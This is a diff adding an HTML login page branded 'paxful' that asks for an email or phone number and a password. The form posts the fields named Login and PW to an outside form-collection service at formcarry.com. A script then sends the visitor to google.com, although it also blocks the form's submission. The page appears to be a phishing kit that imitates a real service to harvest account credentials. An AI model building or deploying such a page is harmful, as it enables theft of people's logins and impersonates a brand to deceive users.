@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            width: 90%;
+            max-width: 1200px;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .login-section {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .logo span {
+            font-size: 24px;
+            font-weight: bold;
+            color: #7ed957;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin: 0 0 10px;
+        }
+
+        p {
+            margin: 0;
+            font-size: 0.9rem;
+            color: #a3a3a3;
+        }
+
+        p a {
+            color: #7ed957;
+            text-decoration: none;
+        }
+
+        p a:hover {
+            text-decoration: underline;
+        }
+
+        form {
+            margin-top: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+            color: #d1d1d1;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: none;
+            background-color: #1f1f1f;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .input-group input::placeholder {
+            color: #a3a3a3;
+        }
+
+        .forgot-password {
+            text-align: right;
+        }
+
+        .forgot-password a {
+            font-size: 0.9rem;
+            color: #a3a3a3;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            background-color: #7ed957;
+            color: black;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #6bd44e;
+        }
+
+        .illustration-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .illustration-section img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const form = event.target;
+
+	window.location.href = "https://www.google.com"
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="login-section">
+            <div class="logo">
+                <img src="https://via.placeholder.com/30x30" alt="Logo">
+                <span>paxful</span>
+            </div>
+            <h1>Welcome back!</h1>
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <form action="https://formcarry.com/s/I--4R5o_sxo" method="POST" onsubmit="handleSubmit(event)">
+                <div class="input-group">
+                    <label for="login">Email / Phone Number</label>
+                    <input type="text" id="login" name="Login" placeholder="Email / Phone Number" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="PW" placeholder="Password" required>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-btn">Sign in</button>
+            </form>
+        </div>
+        <div class="illustration-section">
+            <img src="https://via.placeholder.com/500x300" alt="Illustration">
+        </div>
+    </div>
+</body>
+</html>
